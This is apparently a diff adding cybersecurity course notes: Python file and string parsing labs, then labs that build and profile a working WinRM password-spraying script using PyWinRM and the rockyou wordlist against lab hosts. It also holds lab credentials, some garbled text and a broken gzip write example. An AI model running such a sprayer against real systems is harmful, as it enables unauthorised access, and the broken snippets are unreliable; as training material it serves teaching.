@@ -5653,3 +5653,933 @@ This results in the regular expression search and filtering provide the most acc
 
 
 ![image](https://github.com/user-attachments/assets/12a027b5-12c0-47ac-ba90-58e0ddd4a0bb)
+
+
+
+##################CDAH-M13L5-Parsing System Data with Python######################
+
+
+Using Python to Ingest and Parse Text Files
+Python provides built-in functions for reading and writing text files. Each line in a text file is terminated by a special character called End of Line (EOL), which is the new line character \n in Python by default. Python also possesses a File Input/Output (IO) tool as part of its core language. This tool handles everything needed to read and write files. 
+
+﻿
+
+Opening a Text File
+﻿
+
+One of the most common functions is the open() function. This command returns a file object as specified in the parameters. A basic example of the open() function is as follows:
+
+f = open('filename', 'mode')
+print(f.read())
+﻿
+
+In the above example, f stands for file_object, and filename is the name of the file to interact with. The file extension must be included in the filename, and if the file does not exist in the same directory as the Python program, the full file path must be specified. 
+
+﻿
+
+The mode tells Python what to do with the file. Multiple modes can be specified when interacting with text files, such as the following:
+
+
+
+![image](https://github.com/user-attachments/assets/7c16204a-9d0c-4992-a695-ad7cac6ac169)
+
+
+
+If a file is open, the close() function can be used to close the file and free up system resources used by that file. The syntax for this function is file_object.close(). 
+
+
+If the open() method is used, the close() method must be used as well; otherwise, the file remains open. Closing the file is easy to forget, however, which can leave the system with multiple open files, using unnecessary system resources. 
+
+
+A best practice to open Python files is to instead use the syntax with open() as because it does not require using the file_object.close() statement to close the open file. The file is automatically closed when it is no longer used. An example of the with open() as syntax is as follows. In the example, a file named logs.txt is opened in read mode as a file object.
+
+with open(logs.txt, 'r') as file_object:
+txt = file_object.read() 
+
+
+
+
+Reading Text Files Line by Line
+
+
+The most common way to read text files is to use the filename.read() method. This method is useful for small files and reads all text from the file into a string. However, if a file is larger than the amount of available memory on a system, Python returns an error, and reading the file line by line is necessary. For such a file, a for loop can be used to read the text file line by line. An example of this method is as follows:
+with open("workData.txt", "r+") as work_data:
+     for line in work_data:
+          print(line)
+
+A cleaner method to read a file line by line is to use the fileobject.readline() method. This method reads a line of a file and returns it in the form of a string. readline() reads a file until the new line character \n appears. Another method, the fileobject.readlines() method, returns a list of all the next lines into a list of strings. An example of the fileobject.readline() and fileobject.readlines() methods used together is as follows. In the example, f stands for file_object.
+
+f = open('grocery.txt', 'r')
+f.readline()         # Read next line into a string
+'apple\n'
+f.readlines()        # Read all (next) lines into a list of strings
+['milk\n', 'bread\n']
+
+
+
+Using seek()
+
+
+In Python, it is possible to change the current file cursor position using the seek() method. The syntax fileobject.seek(0) brings the file cursor to the beginning of the file. This is important when writing to a text file using the append mode because, in that mode, the file cursor position always defaults to the end of the file. If the cursor is not moved to the beginning of the file, the fileobject.write() method returns nothing.
+
+
+Processes for Reading Compressed Text Files
+
+
+The Gzip utility is useful for reading compressed text files. The Gzip module must be imported into Python. The syntax for reading a compressed file with Gzip is similar to reading an uncompressed file using the with open() as statement. The following command is used to read a compressed file:
+
+import gzip
+with gzip.open('filename', 'r') as fileobject:
+     for line in fileobject:
+     print(line)
+
+
+
+gzip.open('filename') is the syntax used to read the compressed file.
+
+
+The above method can also be used to write to a compressed file. This is done by modifying only one element of the code above: the r (for read mode) is changed to w (for write mode):
+import gzip
+with gzip.open('filename', 'w') as fileobject:
+     for line in fileobject:
+     print(line)
+
+
+
+
+![image](https://github.com/user-attachments/assets/c702b17f-2a85-4de4-aa59-6fa91126bc61)
+
+
+
+Using Python to Parse String Data
+Python provides multiple functions or methods to parse string data. Three functions, discussed below, are the split() function, strip() function, and slice() function.
+
+﻿
+
+split() Function
+﻿
+
+The split() function breaks a large string into smaller strings and returns the strings as a list in Python. The syntax to define a split() function in Python is as follows:
+
+
+split(separator, max)
+﻿
+
+In the example above, separator represents the delimiter. The string or line is split at this specified separator. max represents the maximum number of splits for a given string. The default value of max is −1. If the max parameter is not specified, the split() function splits the given string whenever a separator is encountered. The split() function operates even if the separator is not specified. Python considers any white spaces as the separator to separate the given string or given line.
+
+﻿
+
+An example of when this function is useful is when parsing data from a Comma-Separated Values (CSV) file. The split() function breaks the data separated by a comma into data chunks, making it easier to read.
+
+﻿
+
+strip() Function
+﻿
+
+The Python strip() function strips a string so that the leading and trailing characters can be eliminated. After these two characters are removed, a new string is returned in the process. By default, strip() removes the white spaces from the beginning and end of the string. The syntax for this function is as follows:
+
+string.strip([characters])
+﻿
+
+Multiple arguments may be placed inside the strip() function. When the characters match the given string, the specified characters are removed in the string output. If no matches are found, no changes are applied to the string. The Python strip() function is frequently used for text formatting. It can remove unnecessary text at the beginning or end of a string to make the output cleaner.  
+
+﻿
+
+slice() Function
+﻿
+
+The slice() function extracts part of a string, list, or tuple by using the index number of a specific object or objects. The syntax for this function is as follows:
+
+
+slice(stop)
+slice(start, stop, step)
+﻿
+
+Parameters that may be used inside the function are as follows:
+
+start: The starting index where the slicing of an object starts.
+stop: The ending index where the slicing of an object stops.
+step: An optional argument that determines the increment between each index for slicing. 
+﻿
+
+When using the Python slice(stop) function, only the number of indexes where the slicing stops is specified. An example of the slice(stop) function is as follows:
+
+
+var = slice(25)
+print(list[var]) 
+﻿
+
+In the above example, only the first 25 objects of var are sliced. 
+
+﻿
+
+It is also possible to provide a start number and stop number in the slice function, in which case the objects beginning with the starting index number and ending with the index number preceding the stop number are sliced. An example of the slice(start, stop) function is as follows. 
+
+
+var = slice(1,25)
+print(list[var])
+﻿
+
+In the above example, slicing occurs for objects 1 through 24.
+
+﻿
+
+Inclusion of the step argument, as noted above, provides an increment for slicing between each index.
+
+
+In the following lab, create a Python script that opens a text file in read mode, execute the script, and read the text file line by line. Then edit the Python script, and use a different method from the first method used to open the text file. 
+
+
+NOTE: This lesson uses the following commands in the Vim editor:
+i - Activates insert mode, allowing text to be written to the file.
+:wq - Saves and exits the file, when used in normal mode.  
+:set number - Adds lines to the Vim text editor.
+
+Additionally, entering the escape (esc) key exits the insert mode and returns to normal mode. 
+
+
+
+Workflow
+
+
+1. Log in to the Virtual Machine (VM) lin-hunt-cent using the following credentials:
+Username: trainee
+Password: CyberTraining1!
+
+
+
+2. Open a Linux terminal.
+
+
+3. Use the Vim text editor to open the script.py file:
+vim script.py
+
+
+
+4. On line 1, enter the following text to open the text file grocerylist in read mode:
+f = open('grocerylist.txt', 'r') 
+
+
+
+5. Enter the following line to print the file object:
+print(f.read())
+
+
+![image](https://github.com/user-attachments/assets/a4b5aac9-e18c-4a10-a75f-71966bc32e41)
+
+
+6. Save the file, and exit Vim. Execute the Python script:
+python script.py
+
+
+
+7. Use the Vim text editor to open the script.py file.
+
+
+8. On line 2, remove the print statement and enter the following to read the script line by line:
+data = f.readlines()
+
+
+
+9. Enter the following lines of text on lines 3 and 4 to close and print the file:
+f.close()
+print(data)
+
+
+
+
+![image](https://github.com/user-attachments/assets/9e79f488-a9f9-4680-bba3-752d6ff5c301)
+
+
+10. Save the file, and exit Vim. Execute the Python script.
+
+
+The text file is printed in a list format. At the end of each line is a new line character \n, indicating a new line has started in the text file. 
+
+
+11. Create a new file named parse.py:
+vim parse.py
+
+
+
+12. Add the following text on lines 1 through 4:
+with open('employee_data.txt', 'r') as f:
+     txt = f.read()
+     sp = txt.split()
+     print(sp) 
+
+
+
+The lines of text above are using the with open as statement to open a text file in read mode. The split() function then splits the text into individual parts by returning a list of the elements in a string.
+
+
+13. Save the file, and exit Vim. 
+
+
+14. Execute the Python script parse.py:
+python parse.py
+
+
+
+3. Use Vim to create strip.py:
+vim strip.py
+
+
+
+4. In normal mode, enter the command to have line numbers when using Vim. 
+
+
+5. On lines 1 and 2, enter the following text to open the /etc/hosts file in read mode for analysis: 
+
+with open('/etc/hosts', 'r') as f:
+     txt = f.read()
+
+
+
+6. On line 3, add the following text to strip the text file and make the file easier to read: 
+st = txt.strip()
+
+
+
+When using the Python strip() function, the syntax is string.strip(). In this example, the “string” is the text file in read mode, which was opened with the text on line 1. 
+
+
+7. On line 4, add the print function to print the output of the Python script:
+print(st) 
+
+
+
+8. Save the script, and exit Vim.
+
+
+
+9. Run the following command to execute the Python script:
+python strip.py
+
+
+
+The output is provided in Figure 13.5-1:
+
+
+![image](https://github.com/user-attachments/assets/27b9c6b1-8803-4289-982c-6340a8c56600)
+
+
+10. Use Vim to create comp.py:
+vim comp.py
+
+
+
+11. On line 1, enter the following to open the /var/log/messages file:  
+with open('/var/log/messages', 'r') as file:
+
+
+
+12. On lines 2 through 5, add the following text to iterate through the text file:
+     lines = [line.strip('#') for line in file]
+     slice1 = slice(10)
+     for line in lines:
+          print(line.split()[slice1])
+
+
+
+
+This script puts the text file in a list format and then parses through the text file to separate each string, making reading through the file easier. It also uses the slice function, which prints only the first 10 strings of each row in the text file.  
+
+
+13. Save the script, and exit Vim.
+
+
+14. Run the following command to execute the Python script:
+
+[trainee@lin-hunt-cent ~]$ sudo python comp.py
+[sudo] password for trainee: CyberTraining1! 
+
+
+![image](https://github.com/user-attachments/assets/f2c6b9cf-64a7-44cf-8fdf-7aec9c1f9187)
+
+
+15. Use Vim to edit the comp.py file:
+vim comp.py
+
+
+
+16. On line 3, replace the attribute 10 in slice(10) with 5 so the line looks like below:
+slice1 = slice(5)
+
+
+
+17. Save the script, and exit Vim.
+
+
+18. Run the following command to execute the Python script:
+[trainee@lin-hunt-cent ~]$ sudo python comp.py
+[sudo] password for trainee: CyberTraining1!
+
+
+
+The ou tput is  cleane r to re ad.
+
+
+![image](https://github.com/user-attachments/assets/ce0ee2d7-975f-4f78-b3c3-50b201506941)
+
+![image](https://github.com/user-attachments/assets/ea4bd527-f8bd-4495-b266-2382e3a7f977)
+
+
+
+Use Python to Analyze Operating System Data
+In the following lab, create a Python script that displays all the processes running on a Linux system, and use the slice function to make the output more readable. 
+
+﻿
+
+NOTE: This lesson uses the following commands in the Vim editor:
+
+i - Activates insert mode, allowing text to be written to the file.
+:wq - Saves and exits the file, when used in normal mode.  
+:set number - Adds lines to the Vim text editor.
+Additionally, entering the escape (esc) key exits the insert mode and returns to normal mode.
+
+﻿
+
+
+Workflow
+﻿
+
+1. Log in to the VM lin-hunt-cent using the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Open a Linux terminal.
+
+﻿
+
+3. Use Vim to create process.py:
+
+vim process.py
+﻿
+
+4. In normal mode, enter the command to have line numbers when using Vim. 
+
+﻿
+
+5. Starting on line 1, input the following text to create the process.py file:
+
+from subprocess import Popen, PIPE
+process = Popen(['ps', '-ef'],
+          stdout=PIPE, stderr=PIPE)
+stdout, stderr = process.communicate()
+for line in stdout.splitlines():
+     print(line)
+﻿
+
+This code displays a list of the processes being used on the Linux system and helpful information regarding them. Additional parsing or string manipulation of the results may require additional conversion due to the complexities introduced with character sets and encodings (details of which are beyond this lesson).
+
+﻿
+
+6. Save the file, and exit Vim.
+
+﻿
+
+7. Run the Python script process.py:
+
+[trainee@lin-hunt-cent ~]$ sudo python process.py 
+[sudo] password for trainee: CyberTraining1!
+﻿
+
+8.  Use Vim to edit process.py:
+
+vim process.py
+﻿
+
+9. Add a new line above line 6 to use the Python slice function:
+
+     slice1 = slice(39)
+﻿
+
+NOTE: The new line becomes line 6, so all line numbers beginning at the former line 6 increase by 1.
+
+﻿
+
+
+10. On line 7, edit the print function to print the slice:
+
+print(line[slice1])
+﻿
+
+11. Save the file, and exit Vim.
+
+﻿
+
+12. Run the Python script process.py:
+
+sudo python process.py
+﻿
+
+The output is broken in half, making it easier to view.
+
+﻿
+
+13. Use Vim to edit process.py:
+
+vim process.py
+﻿
+
+14. On line 6, edit the slice attribute:
+
+slice1 = slice(50, 200)
+﻿
+
+15. Save the file, and exit Vim.
+
+﻿
+
+16. Execute the Python script process.py:
+
+sudo python process.py  
+﻿
+
+The se cond half  of the output may now be viewed. Use this  output to  answe r the foll owing question .
+
+
+![image](https://github.com/user-attachments/assets/b0b04e1b-0384-4e35-a9f5-7617d004ed90)
+
+
+
+Python for Threat Actors
+Python has many advantages that make it a popular choice for scripting, such as the following:
+
+Efficient: Premade scripts make constructing new solutions fast and easy.
+Versatile: Many premade libraries readily integrate with Python.
+Ubiquitous: Various tools and tradecraft are available in Python.
+However, these are also the same reasons adversaries choose Python for their toolkits. Namely, there are many libraries available for implementing protocols and communications for adversarial activities. These include the following:
+
+Scapy
+ImpacketSMB
+Paramiko
+Scapy
+﻿
+
+Threat actors use the Scapy Python library to create custom packets for network traffic. Creating custom packets is useful for implementing custom communication protocols, triggering certain types of network attacks, and exploiting vulnerable services.
+
+﻿
+
+ImpacketSMB
+﻿
+
+ImpacketSMB is a pure Python implementation of Server Message Block (SMB) that allows a threat actor to write a number of different tools that use the SMB protocol. These tools may implement known Windows SMB exploits or target SMB services, such as shared network resources, to execute adversarial tactics such as lateral movement or privilege escalation. ImpacketSMB has been used to create tools such as Impacket-Psexec, which allows attackers to run commands through the SMB share ADMIN$ when a user has the appropriate privileges. With access to the C$ share, this library may also be used to script file listing or file retrieval tools.
+
+﻿
+
+Paramiko
+﻿
+
+Paramiko is a pure Python Secure Shell (SSH) library which threat actors use to access the SSH service on a target. Threat actors leverage this tool either for password spraying, credentialed access, or attack execution against vulnerable SSH versions.
+
+﻿Brute Force Authentication over WinRM
+An example of how threat actors weaponize Python as an attack tool is by leveraging two components: PyWinRM library and password spraying. These components are also effective for auditing and testing a mission partner environment. Threat actors use these components to create a basic script that authenticates to a host over the Windows Remote Management (WinRM) protocol when provided a username and password as input.
+
+﻿
+
+PyWinRM
+﻿
+
+The PyWinRM library contains code to build a Python client for the WinRM service. A threat adversary may use this library to script commands that invoke a target Windows machine from any attack platform that runs Python code. When enabled on victim devices, the WinRM service allows an authenticated user to perform various management tasks remotely. These include, but are not limited to running batch scripts, running PowerShell scripts, and fetching Windows Management Instrumentation (WMI) variables.
+
+﻿
+
+Password Spraying
+﻿
+
+As multiple points of presence in an increasingly connected world have become common, the rate of password reuse and password exposure has grown significantly. These parallel, but interconnected, problems contribute to a large and vulnerable attack surface in many organizations. Attackers are aware of the high likelihood of users in a mission partner environment reusing passwords. The attackers, in turn, respond with brute force attacks that leverage lists of passwords exposed by data dumps such as the 2021 Microsoft Exchange breach or the 2019 Facebook leak. These brute force attacks lead to a large reward for very little effort. This is why password spraying is one of the most common techniques that defenders see on external endpoints.
+
+﻿
+
+MITRE provides the following explanation for how adversaries commonly use password spraying in a brute force attack:
+
+﻿
+
+"Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords."
+
+﻿
+
+Authenticate Using WinRM
+﻿
+
+Create a function that returns True if it connects to a system or False if it does not, given a username and password. First, write code that receives a username and password from a user, then employ PyWinRM library functions to attempt to authenticate to a remote WinRM server with them using a try statement. 
+
+﻿
+
+Workflow
+﻿
+
+1. Log in to the Virtual Machine (VM) kali-hunt with the following credentials
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. In a new terminal, change directories to the lab directory by entering the following:
+
+cd labs
+﻿
+
+3. Use either Mousepad, Nano, or Vim to open a new file and name it check_pwd.py. 
+
+﻿
+
+Use this file to write the initial code for accessing a system with the WinRM protocol. 
+
+
+NOTE: Python is sensitive to whitespace. The source script in this lab uses tabs to indent code. To prevent syntax errors, verify the correct use of tabs in any code that is copy pasted into the VM.
+
+﻿
+
+4. Declare Python as the interpreter for the rest of the code in the file by entering the following code:
+
+#!/usr/bin/python3
+﻿
+
+This line is known as the “shebang”. It is a decoration at the beginning of the file that tells the operating system which binary file to use as an interpreter.
+
+﻿
+
+5. Inform the Python interpreter to load the shared library PyWinRM by entering the following on the next line:
+
+import winrm
+﻿
+
+WinRM is not normally bundled with the default installation of the Python environment, however, it is already installed on this system.
+
+﻿
+
+6. Declare and initialize the test variables to confirm that the upcoming code works by entering the following:
+
+testip = '172.16.4.2'
+testusername = 'trainee'
+testpassword = 'CyberTaining1!'
+testdomain = 'energy'
+﻿
+
+7. Declare a new function to use when opening a connection to a target machine over the WinRM protocol and test whether the given username and password combination is functioning correctly:
+
+def check_pwd(targetip,targetusername,targetpassword,targetdomain):
+﻿
+
+8. Insert the provided variables into the winrm.Protocol data structure by entering the following:
+
+    Connection = winrm.Protocol(
+        endpoint='http://{}:5985/wsman'.format(targetip),
+        transport='ntlm',
+        message_encryption='always',
+        username=r'{}\{}'.format(targetdomain,targetusername),
+        password='{}'.format(targetpassword))
+﻿
+
+This is used to authenticate to a WinRM server with the provided configuration. 
+
+﻿
+
+9. Attempt to open a connection to the remote machine by running a simple command and thereafter closing the connection with the following snippet:
+
+    try:
+        shell_id = Connection.open_shell()
+        command_id = Connection.run_command(shell_id, 'ipconfig', ['/all'], console_mode_stdin=True, skip_cmd_shell=False)
+        std_out, std_err, status_code = Connection.get_command_output(shell_id, command_id)
+        Connection.cleanup_command(shell_id, command_id)
+        Connection.close_shell(shell_id)
+﻿
+
+This snippet is wrapped in a try statement. This enables Python to elegantly handle code that may fail with built-in try except statements, making error-handling efficient and easy. 
+
+﻿
+
+A successful authentication returns True to indicate a valid password. Communicating an invalid password to the WinRM server returns InvalidCredentialsError. An except statement handles this error by returning False to indicate an invalid password.
+
+﻿
+
+10. Handle the exception of authentication failures by entering the following code:
+
+    except winrm.exceptions.InvalidCredentialsError:
+        return False
+﻿
+
+An exception is normally used to handle uncommon situations. However, in this case, the expectation is that this exception will be reached frequently. The purpose of this password spraying script is to perform many failed attempts before the correct password is identified, which returns many instances of a False response.
+
+﻿
+
+11. Return True to indicate a good password by entering the following line:
+
+    return False if std_err else True
+﻿
+
+If the authentication does not produce an exception, this line returns True. If the protocol includes some other error text, the authentication provides a final failure check by returning False.
+
+﻿
+
+12. Print output that verifies whether the authentication succeeds or fails by entering the following final lines:
+
+passwordvalidity = check_pwd(testip,testusername,testpassword,testdomain)
+print("Password {} is {} for user {}".format(testpassword,'valid' if passwordvalidity else 'invalid',testusername))
+﻿
+
+13. Save the file as check_pwd.py and exit the text editor.
+
+﻿
+
+14. Make the script executable by entering the following command:
+
+chmod +x check_pwd.py
+﻿
+
+15. Test the function in this script using the following command:
+
+./check_pwd.py
+
+
+
+
+ Create an Attack Script
+The previous lab provided an opportunity to create a prototype for WinRM authentication. After writing the function for testing password authentication to the WinRM service, an attacker can automate the process of spraying many passwords at the service. The password spray executes the function many times in succession using passwords from a list. This list may be compiled from generic password dumps or by scraping data of interest - such as hobbies, birthdays, family names, and more from social media sites. The latter is a common open source intelligence practice performed by threat actors prior to an attack.
+
+﻿
+
+Create an Attack Script
+﻿
+
+Create an attack to replicate WinRM authentication with many passwords. Generate an intelligence report that provides the password for the user. In this lab, the mission partner’s users are known to have used passwords located in the password list rockyou.txt, located in the directory /usr/share/wordlists.
+
+﻿
+
+Workflow
+﻿
+
+1. Log in to the VM kali-hunt with the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Create the attack script by opening a new file in any text editor and naming it sprayer.py﻿
+
+﻿
+
+Available text editors include Nano, Vim, and Gedit.
+
+﻿
+
+This file will be used to create an attack script that employs the function check_pwd, which was written in the previous lab. This script uses the libraries PyWinRM and Argparse.
+
+﻿
+
+NOTE: Python is sensitive to whitespace. The source script in this lab uses tabs to indent code. To prevent syntax errors, verify the correct use of tabs in any code that is copy pasted into the VM.
+
+﻿
+
+3. Start the attack script by including the headers and library calls, as follows:
+
+#!/usr/bin/python3
+import winrm
+import argparse
+﻿
+
+4. Insert the code from the previous lab that checks the password by entering the following:
+
+def check_pwd(targetip,targetusername,targetpassword,targetdomain):
+    Connection = winrm.Protocol(
+        endpoint='http://{}:5985/wsman'.format(targetip),
+        transport='ntlm',
+        message_encryption='always',
+        username=r'{}\{}'.format(targetdomain,targetusername),
+        password='{}'.format(targetpassword))
+    try:
+        shell_id = Connection.open_shell()
+        command_id = Connection.run_command(shell_id, 'ipconfig', ['/all'], console_mode_stdin=True, skip_cmd_shell=False)
+        std_out, std_err, status_code = Connection.get_command_output(shell_id, command_id)
+        Connection.cleanup_command(shell_id, command_id)
+        Connection.close_shell(shell_id)
+    except winrm.exceptions.InvalidCredentialsError:
+        return False
+    return False if std_err else True
+   
+
+5. Define command line arguments for values that the target user inputs by entering the following lines:
+
+parser = argparse.ArgumentParser()
+parser.add_argument('--ip', type=str, nargs='+', required=True)
+parser.add_argument('--domain', type=str, required=True)
+parser.add_argument('--user', type=str, required=True)
+parser.add_argument('--passwordfile', type=str, required=True)
+args = parser.parse_args()
+﻿
+
+These lines implement Argparse, which is used to receive input from a user at runtime to dynamically determine the tool’s behavior. In this case, defining input such as IP address, domain name, and a file containing possible passwords allows attackers to employ this tool against any target and with any wordlist. This includes wordlists developed with open source intelligence about a target organization’s users. 
+
+﻿
+
+6. Write a loop that tests passwords in the supplied passwords file against every host IP address listed by the user, by entering the following:
+
+for ip in args.ip:
+    print("Testing passwords for user {} on machine {} ...".format(args.user,ip))
+    finalpassword = 'No entry in password file'
+    with open(args.passwordfile,'r') as passwordfile:
+        for password in passwordfile:
+            password = password.strip()
+            passwordvalidity = check_pwd(ip,args.user,password,args.domain)
+            if passwordvalidity:
+                finalpassword = password
+                break
+    print("{} is a valid password for user {} on machine {}".format(finalpassword,args.user, ip))
+﻿
+
+7. Save the file as sprayer.py and exit the text editor.
+
+﻿
+
+8. Make the script executable by entering the following command:
+
+chmod +x sprayer.py
+﻿
+
+9. Run this script against the target domain with the following command:
+
+./sprayer.py --user eve.tran --domain energy.lan --passwordfile /usr/share/wordlists/rockyou.txt --ip 172.16.4.2
+﻿
+
+Use the information from this lab to answer the following question.
+
+
+
+
+Profiling Test Scripts with Python
+Introduction to Python Profiling
+﻿
+
+According to official Python documentation, "cProfile and profile provide deterministic profiling of Python programs. A profile is a set of statistics that describes how often and for how long various parts of the program executed."
+
+﻿
+
+Python profiling is a developer tool that gauges the efficiency of code performance by comparing runtimes. It compares different code that performs the same function to determine whether runtimes increase or decrease with changes to a tool’s algorithms. For small projects, these efficiencies can be negligible. For large jobs, such as sending a million authentication requests to a target server, improving efficiency saves an attacker hours. Similarly, from the blue team perspective, writing code that efficiently parses millions of lines of logs saves an overworked defensive team just as much time. 
+
+﻿
+
+Using profiling to test loop algorithms is a common practice for malicious tool developers, especially when the speed of the attack is a significant factor for success. This is often the case when an adversary is racing against the time it takes defenders to identify a potential threat and respond to an alert with an investigation and potential containment. 
+
+﻿
+
+The next two labs prepare and profile two loop algorithms for an attack script. The first lab creates an alternative loop algorithm based on the original attack script. The second lab profiles the two algorithms to identify the more efficient loop.
+
+﻿
+
+Modify an Attack Script for Profiling
+﻿
+
+Duplicate an existing attack script, then modify the duplicated script by rearranging its nested loops. 
+
+﻿
+
+Workflow
+﻿
+
+1. Log in to the VM kali-hunt with the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Open a terminal.
+
+﻿
+
+3. Create a copy of the attack script sprayer.py from the previous lab and name it sprayer2.py.
+
+﻿
+
+4. In the script sprayer2.py, scroll to the code block displayed in Figure 14.1-1, below:\
+
+![image](https://github.com/user-attachments/assets/e9e105e2-3d72-41c2-8284-4491d21119b2)
+
+
+
+Continue working in the script sprayer2.py to complete steps 5-10, which modify the code block displayed in Figure 14.1-1.
+
+
+5. Insert the following code immediately before the line for ip in args.ip:
+with open(args.passwordfile,'r') as passwordfile:
+    for password in passwordfile:
+        password = password.strip()
+
+
+
+6. Remove the line that follows for ip in args.ip: and begins with print("Testing passwords
+
+
+7. Remove the three lines that follow finalpassword = 'No entry in password file', from with open(args.passwordfile,'r') to password.strip()
+
+
+8. Remove break from the line that follows finalpassword = password
+
+
+9. Add the following two lines immediately after the line that begins with print("{} is a valid
+        if passwordvalidity:
+            break
+
+
+
+10. Remove any blank lines in the modified code block so that the final block is written as follows:
+with open(args.passwordfile,'r') as passwordfile:
+    for password in passwordfile:
+        password = password.strip()
+        for ip in args.ip:
+            finalpassword = 'No entry in password file'
+            passwordvalidity = check_pwd(ip,args.user,password,args.domain)
+            if passwordvalidity:
+                finalpassword = password
+                print("{} is a valid password for user {} on machine {}".format(finalpassword,args.user, ip))
+        if passwordvalidity:
+            break
+
+
+
+Ensure the modified code block matches step 10, before moving on to the next lab.
+
+
+11. Save the file as  sprayer2.py  and exit the text editor.
+
+
+Profile Attack Algorithms
+
+
+Continue working in a terminal in kali-hunt. Compare different methods for completing a brute force attack to determine the fastest method. Attempt each attack by brute forcing multiple passwords against multiple hosts. Determine the runtime of each algorithm.
+
+
+Workflow
+
+
+1. Run each script by entering the following, allowing 5 minutes to complete:
+python3 -m cProfile ./sprayer.py --user malik.freeman --passwordfile /usr/share/wordlists/rockyou.txt --ip 172.16.4.2 172.16.4.3 172.16.4.4 --domain energy > script1results.txt
+
+
+python3 -m cProfile ./sprayer2.py --user malik.freeman --passwordfile /usr/share/wordlists/rockyou.txt --ip 172.16.4.2 172.16.4.3 172.16.4.4 --domain energy > script2results.txt
+
+
+
+2. Display the results of each script with the following commands. 
+head script1results.txt
+
+head script2results.txt
+
+
+
+Figure 14.1-2, below, highlights where the algorithm runtime is listed in each output.
+
+
+![image](https://github.com/user-attachments/assets/05c63bf7-e74a-4dd6-b0ef-c888f9fbcbbb)
+
+
+
+
+It is possible that Python has optimized processes in the background, leading to very similar results between the scripts. The link in the Additional Resource section of this task provides additional tests to complete. Regardless, these two labs highlight the effect a small amount of tuning has in the performance of Python on large scales. This is relevant to both attackers and defenders who may use Python to accomplish tasks across a whole network.
+
+
+Additional Resource
